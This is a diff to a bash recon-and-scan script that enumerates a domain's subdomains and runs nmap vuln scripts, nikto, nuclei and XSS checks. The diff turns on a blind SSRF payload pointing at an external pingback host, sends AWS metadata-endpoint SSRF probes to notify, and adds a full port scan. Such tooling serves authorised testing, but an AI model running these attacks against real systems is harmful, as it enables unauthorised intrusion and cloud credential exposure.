@@ -17,7 +17,7 @@ sort $domain/subdomains/all.txt | uniq -u $domain/subdomains/all.txt > $domain/s
 cat $domain/subdomains/output.txt | sed 's/www.//' > $domain/subdomains/nowww.txt
 sort $domain/subdomains/nowww.txt | uniq > $domain/subdomains/subdomains.txt
 httpx -l $domain/subdomains/subdomains.txt -o $domain/subdomains/httpx.txt
-cat $domain/subdomains/httpx.txt | sed 's/http[s]\?:\/\///' > $domain/subdomains/nmap_formatted_list.txt
+cat $domain/subdomains/httpx.txt | sed 's/http[s]\?:\/\///' > $domain/subdomains/nmap_formatted_list_http.txt
 cd $domain/subdomains/
 rm sublist3r.txt
 rm subfinder.txt
@@ -25,10 +25,9 @@ rm assetfinder.txt
 rm all.txt
 rm output.txt
 rm nowww.txt
-rm subdomains.txt
 rm gobusterdns.txt
 rm findomain.txt
-notify --bulk -data nmap_formatted_list.txt
+notify --bulk -data nmap_formatted_list_http.txt
 echo "$(wc -l httpx.txt | sed 's/httpx.txt//') alive subdomains found" | notify
 cd ../../
 
@@ -39,7 +38,7 @@ notify --bulk -data ./$domain/scanners/nikto.txt
 echo "\`\`\`Nikto scan ended - ($domain)\`\`\`" | notify
 }
 nmap_scan(){
-nmap --script vuln -iL $domain/subdomains/nmap_formatted_list.txt -o $domain/scanners/nmap.txt
+nmap --script vuln -iL $domain/subdomains/nmap_formatted_list_http.txt -o $domain/scanners/nmap.txt
 notify --bulk -data ./$domain/scanners/nmap.txt
 echo "\`\`\`Nmap scan ended - ($domain)\`\`\`" | notify
 }
@@ -71,14 +70,18 @@ gau -subs $domain >> $domain/intel/urls.txt
 cat $domain/intel/urls.txt | sort -u | anew | httpx >> $domain/intel/testurls.txt
 rm $domain/intel/urls.txt
 echo "$(wc -l $domain/intel/testurls.txt | sed 's/testurls.txt//')urls found" | notify
-#echo "\`\`\`Testing for Blind SSRF on $domain\`\`\`" | notify
-#cat $domain/intel/testurls.txt | qsreplace "http://pingb.in/p/936ed688aa80d085baab9392b58c" >> blindssrftest.txt
-#ffuf -c -w blindssrftest.txt -u FUZZ
-#rm blindssrftest.txt
+echo "\`\`\`Testing for Blind SSRF on $domain\`\`\`" | notify
+cat $domain/intel/testurls.txt | qsreplace "http://pingb.in/p/936ed688aa80d085baab9392b58c" >> blindssrftest.txt
+ffuf -c -w blindssrftest.txt -u FUZZ
+rm blindssrftest.txt
 echo "Testing for SSRF in AWS" | notify
-cat $domain/intel/testurls.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
+cat $domain/intel/testurls.txt | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! % " | notify'
 rm $domain/intel/testurls.txt 
 }
+port_scan(){
+nmap -iL $domain/subdomains/subdomains.txt -p- -T4 -vv -sCV -o $domain/intel/ports.txt
+}
+
 param_reflection & ssrf_check
-nikto_scan & nmap_scan & nuclei_scan & xss_check & wait
+port_scan & nikto_scan & nmap_scan & nuclei_scan & xss_check & wait
 echo "\`\`\`$domain scan ended\`\`\`" | notify
